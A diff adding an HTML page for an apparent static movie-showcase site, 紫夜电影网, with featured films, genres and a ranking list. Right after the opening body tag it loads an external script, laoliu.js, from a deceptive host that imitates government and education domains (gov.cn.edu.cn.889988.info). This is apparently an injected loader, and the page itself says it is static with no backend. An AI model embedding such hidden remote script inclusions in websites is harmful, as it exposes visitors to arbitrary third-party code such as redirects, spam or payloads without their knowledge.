@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>紫夜电影网 - 深夜影视在线观看</title>
+<meta name="description" content="紫夜电影网，一个适合深夜观影的影视资源站，精选电影、剧集、动漫、综艺，界面优雅，加载快速。官网 https://ziyedianyingwang-h5.github.io">
+<meta name="keywords" content="紫夜电影网, 深夜电影, 在线观看, 高清影视, 影视推荐">
+<meta name="author" content="紫夜电影网">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="theme-color" content="#0f0520">
+<style>
+:root{
+  --bg:#0f0520;
+  --bg2:#1a0a3e;
+  --card:#1e1245;
+  --card-hover:#2a1860;
+  --line:#3d2a7a;
+  --purple:#a855f7;
+  --purple-light:#c084fc;
+  --purple-dark:#7c3aed;
+  --pink:#f472b6;
+  --text:#ede9fe;
+  --muted:#a78bfa;
+  --star:#fff;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:system-ui,-apple-system,"Microsoft YaHei",Arial,sans-serif;
+  line-height:1.7;
+  min-height:100vh;
+  overflow-x:hidden;
+}
+
+/* 星空背景 */
+.stars{
+  position:fixed;top:0;left:0;width:100%;height:100%;
+  pointer-events:none;z-index:0;
+  background:
+    radial-gradient(1px 1px at 10% 20%,rgba(255,255,255,0.8),transparent),
+    radial-gradient(1px 1px at 20% 50%,rgba(255,255,255,0.6),transparent),
+    radial-gradient(1.5px 1.5px at 30% 80%,rgba(255,255,255,0.7),transparent),
+    radial-gradient(1px 1px at 40% 10%,rgba(255,255,255,0.5),transparent),
+    radial-gradient(1px 1px at 50% 60%,rgba(255,255,255,0.8),transparent),
+    radial-gradient(1.5px 1.5px at 60% 30%,rgba(255,255,255,0.6),transparent),
+    radial-gradient(1px 1px at 70% 70%,rgba(255,255,255,0.7),transparent),
+    radial-gradient(1px 1px at 80% 15%,rgba(255,255,255,0.5),transparent),
+    radial-gradient(1.5px 1.5px at 90% 45%,rgba(255,255,255,0.8),transparent),
+    radial-gradient(1px 1px at 15% 90%,rgba(255,255,255,0.6),transparent),
+    radial-gradient(1px 1px at 85% 85%,rgba(255,255,255,0.7),transparent),
+    radial-gradient(1.5px 1.5px at 95% 10%,rgba(255,255,255,0.5),transparent);
+  animation:twinkle 4s ease-in-out infinite alternate;
+}
+@keyframes twinkle{from{opacity:.7}to{opacity:1}}
+
+/* 渐变球 */
+.glow-orb{
+  position:fixed;border-radius:50%;filter:blur(80px);pointer-events:none;z-index:0;
+}
+.glow-orb-1{width:300px;height:300px;background:rgba(168,85,247,0.15);top:-100px;left:-100px}
+.glow-orb-2{width:250px;height:250px;background:rgba(244,114,182,0.1);bottom:-80px;right:-80px}
+
+a{color:var(--purple-light);text-decoration:none}
+
+/* Hero */
+.hero{
+  position:relative;z-index:1;
+  background:linear-gradient(180deg,rgba(15,5,32,0.9) 0%,rgba(15,5,32,1) 100%);
+  padding:60px 20px 50px;text-align:center;
+  border-bottom:1px solid var(--line);
+}
+.hero-icon{
+  font-size:48px;margin-bottom:12px;
+  animation:float 3s ease-in-out infinite;
+}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+.hero h1{
+  font-size:38px;font-weight:900;margin-bottom:10px;
+  background:linear-gradient(135deg,var(--purple-light),var(--pink));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.hero p{font-size:16px;color:var(--muted);max-width:500px;margin:0 auto 16px}
+.hero-url{
+  display:inline-block;font-size:13px;color:var(--purple-light);
+  background:rgba(168,85,247,0.1);border:1px solid var(--line);
+  padding:8px 18px;border-radius:20px;
+}
+
+/* 主体布局 */
+.main-wrap{
+  position:relative;z-index:1;
+  max-width:1200px;margin:0 auto;padding:30px 16px;
+  display:grid;grid-template-columns:200px 1fr;gap:24px;
+}
+
+/* 左侧分类导航 */
+.side-nav{
+  position:sticky;top:20px;align-self:start;
+}
+.side-nav h3{
+  font-size:13px;color:var(--purple-light);letter-spacing:2px;
+  text-transform:uppercase;margin-bottom:12px;
+}
+.side-nav ul{list-style:none}
+.side-nav li{margin-bottom:6px}
+.side-nav a{
+  display:flex;align-items:center;gap:8px;
+  padding:10px 14px;border-radius:10px;
+  color:var(--text);font-size:14px;
+  transition:.3s;border:1px solid transparent;
+}
+.side-nav a:hover{
+  background:var(--card);border-color:var(--line);
+  color:var(--purple-light);
+}
+.side-nav .icon{font-size:16px}
+
+/* 右侧内容区 */
+.content{display:flex;flex-direction:column;gap:28px}
+
+/* 区块 */
+.block{
+  background:var(--card);
+  border:1px solid var(--line);
+  border-radius:16px;padding:22px;
+  box-shadow:0 4px 24px rgba(0,0,0,0.2);
+}
+.block-header{
+  display:flex;align-items:center;gap:10px;margin-bottom:16px;
+}
+.block-icon{font-size:20px}
+.block-title{font-size:18px;font-weight:700}
+.block-more{margin-left:auto;font-size:12px;color:var(--muted)}
+
+/* 推荐卡片 - 横向大卡片 */
+.featured{
+  display:grid;grid-template-columns:1fr 1fr;gap:14px;
+}
+.feat-card{
+  background:var(--bg2);border:1px solid var(--line);
+  border-radius:12px;overflow:hidden;transition:.3s;
+}
+.feat-card:hover{transform:translateY(-4px);box-shadow:0 8px 30px rgba(168,85,247,0.25)}
+.feat-cover{
+  height:140px;display:flex;align-items:center;justify-content:center;
+  font-size:36px;
+}
+.feat-card:nth-child(1) .feat-cover{background:linear-gradient(135deg,#4c1d95,#7c3aed)}
+.feat-card:nth-child(2) .feat-cover{background:linear-gradient(135deg,#701a75,#a855f7)}
+.feat-card:nth-child(3) .feat-cover{background:linear-gradient(135deg,#0f766e,#06b6d4)}
+.feat-card:nth-child(4) .feat-cover{background:linear-gradient(135deg,#9f1239,#f43f5e)}
+.feat-info{padding:12px}
+.feat-info h4{font-size:15px;margin-bottom:4px}
+.feat-info p{font-size:12px;color:var(--muted)}
+
+/* 类型标签网格 */
+.type-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:10px;
+}
+.type-btn{
+  display:flex;flex-direction:column;align-items:center;gap:6px;
+  padding:14px 8px;background:var(--bg2);
+  border:1px solid var(--line);border-radius:12px;
+  color:var(--text);transition:.3s;
+}
+.type-btn:hover{border-color:var(--purple);background:var(--card-hover)}
+.type-btn .emoji{font-size:24px}
+.type-btn span{font-size:12px}
+
+/* 排行列表 */
+.top-list{list-style:none}
+.top-item{
+  display:flex;align-items:center;gap:12px;
+  padding:12px;border-radius:10px;
+  margin-bottom:8px;background:var(--bg2);
+  border:1px solid transparent;transition:.3s;
+}
+.top-item:hover{border-color:var(--line)}
+.top-num{
+  width:28px;height:28px;border-radius:8px;
+  display:flex;align-items:center;justify-content:center;
+  font-weight:900;font-size:14px;flex-shrink:0;
+}
+.top-item:nth-child(1) .top-num{background:linear-gradient(135deg,#fbbf24,#f59e0b);color:#000}
+.top-item:nth-child(2) .top-num{background:linear-gradient(135deg,#cbd5e1,#94a3b8);color:#000}
+.top-item:nth-child(3) .top-num{background:linear-gradient(135deg,#d97706,#b45309);color:#fff}
+.top-item:nth-child(n+4) .top-num{background:var(--line);color:var(--muted)}
+.top-item h4{flex:1;font-size:14px}
+.top-item .rating{font-size:13px;color:var(--pink);font-weight:600}
+
+/* 关于 */
+.about-text{color:var(--muted);font-size:14px;line-height:1.8}
+.about-text strong{color:var(--purple-light)}
+
+/* 页脚 */
+.foot{
+  position:relative;z-index:1;text-align:center;padding:24px 16px;
+  font-size:13px;color:var(--muted);border-top:1px solid var(--line);
+}
+
+/* 响应式 */
+@media(max-width:860px){
+  .main-wrap{grid-template-columns:1fr}
+  .side-nav{position:static;display:none}
+  .featured{grid-template-columns:1fr}
+  .hero h1{font-size:28px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="stars"></div>
+<div class="glow-orb glow-orb-1"></div>
+<div class="glow-orb glow-orb-2"></div>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="hero-icon">🌙</div>
+  <h1>紫夜电影网</h1>
+  <p>每一个夜晚，都需要一部好电影陪伴。精选深夜片单，让紫夜更温柔。</p>
+  <div class="hero-url">https://ziyedianyingwang-h5.github.io</div>
+</section>
+
+<!-- 主体 -->
+<div class="main-wrap">
+
+  <!-- 左侧导航 -->
+  <aside class="side-nav">
+    <h3>▌ 导航菜单</h3>
+    <ul>
+      <li><a href="#"><span class="icon">🏠</span> 首页</a></li>
+      <li><a href="#featured"><span class="icon">⭐</span> 精选推荐</a></li>
+      <li><a href="#types"><span class="icon">🎭</span> 影片分类</a></li>
+      <li><a href="#rank"><span class="icon">🏆</span> 热播排行</a></li>
+      <li><a href="#about"><span class="icon">ℹ️</span> 关于本站</a></li>
+    </ul>
+  </aside>
+
+  <!-- 右侧内容 -->
+  <main class="content">
+
+    <!-- 精选推荐 -->
+    <section class="block" id="featured">
+      <div class="block-header">
+        <span class="block-icon">⭐</span>
+        <h2 class="block-title">精选推荐</h2>
+        <a href="#" class="block-more">更多 →</a>
+      </div>
+      <div class="featured">
+        <article class="feat-card">
+          <div class="feat-cover">🌌</div>
+          <div class="feat-info">
+            <h4>星际穿越</h4>
+            <p>科幻 / 9.4分 · 穿越时空的爱与勇气</p>
+          </div>
+        </article>
+        <article class="feat-card">
+          <div class="feat-cover">🌹</div>
+          <div class="feat-info">
+            <h4>泰坦尼克号</h4>
+            <p>爱情 / 9.5分 · 永不沉没的经典</p>
+          </div>
+        </article>
+        <article class="feat-card">
+          <div class="feat-cover">🎭</div>
+          <div class="feat-info">
+            <h4>肖申克的救赎</h4>
+            <p>剧情 / 9.7分 · 希望让人自由</p>
+          </div>
+        </article>
+        <article class="feat-card">
+          <div class="feat-cover">🗡️</div>
+          <div class="feat-info">
+            <h4>卧虎藏龙</h4>
+            <p>武侠 / 8.7分 · 东方美学巅峰</p>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- 影片分类 -->
+    <section class="block" id="types">
+      <div class="block-header">
+        <span class="block-icon">🎭</span>
+        <h2 class="block-title">影片分类</h2>
+        <a href="#" class="block-more">全部 →</a>
+      </div>
+      <div class="type-grid">
+        <a href="#" class="type-btn"><span class="emoji">💕</span><span>爱情</span></a>
+        <a href="#" class="type-btn"><span class="emoji">😂</span><span>喜剧</span></a>
+        <a href="#" class="type-btn"><span class="emoji">🔫</span><span>动作</span></a>
+        <a href="#" class="type-btn"><span class="emoji">👽</span><span>科幻</span></a>
+        <a href="#" class="type-btn"><span class="emoji">🔍</span><span>悬疑</span></a>
+        <a href="#" class="type-btn"><span class="emoji">👻</span><span>恐怖</span></a>
+        <a href="#" class="type-btn"><span class="emoji">🗡️</span><span>武侠</span></a>
+        <a href="#" class="type-btn"><span class="emoji">🎨</span><span>文艺</span></a>
+        <a href="#" class="type-btn"><span class="emoji">📜</span><span>历史</span></a>
+        <a href="#" class="type-btn"><span class="emoji">🎌</span><span>动漫</span></a>
+      </div>
+    </section>
+
+    <!-- 热播排行 -->
+    <section class="block" id="rank">
+      <div class="block-header">
+        <span class="block-icon">🏆</span>
+        <h2 class="block-title">热播排行榜</h2>
+        <a href="#" class="block-more">完整榜单 →</a>
+      </div>
+      <ul class="top-list">
+        <li class="top-item">
+          <span class="top-num">1</span>
+          <h4>肖申克的救赎</h4>
+          <span class="rating">9.7</span>
+        </li>
+        <li class="top-item">
+          <span class="top-num">2</span>
+          <h4>泰坦尼克号</h4>
+          <span class="rating">9.5</span>
+        </li>
+        <li class="top-item">
+          <span class="top-num">3</span>
+          <h4>星际穿越</h4>
+          <span class="rating">9.4</span>
+        </li>
+        <li class="top-item">
+          <span class="top-num">4</span>
+          <h4>盗梦空间</h4>
+          <span class="rating">9.3</span>
+        </li>
+        <li class="top-item">
+          <span class="top-num">5</span>
+          <h4>阿甘正传</h4>
+          <span class="rating">9.2</span>
+        </li>
+        <li class="top-item">
+          <span class="top-num">6</span>
+          <h4>楚门的世界</h4>
+          <span class="rating">9.1</span>
+        </li>
+      </ul>
+    </section>
+
+    <!-- 关于 -->
+    <section class="block" id="about">
+      <div class="block-header">
+        <span class="block-icon">ℹ️</span>
+        <h2 class="block-title">关于紫夜电影网</h2>
+      </div>
+      <div class="about-text">
+        <p><strong>紫夜电影网</strong>（https://ziyedianyingwang-h5.github.io）是一个专为深夜观影爱好者打造的影视展示单页。</p>
+        <p style="margin-top:10px">我们精选每一部影片，从经典老片到最新热映，从催泪爱情到烧脑悬疑，让每一个紫夜都有好电影相伴。</p>
+        <p style="margin-top:10px">本页为静态单页演示，内页链接以 <code>#</code> 占位，不依赖后端，不生成 robots.txt 与 sitemap.xml，可直接托管于 GitHub Pages。</p>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<footer class="foot">
+  © 2026 紫夜电影网 · ziyedianyingwang-h5.github.io · 深夜观影伴侣
+</footer>
+
+</body>
+</html>
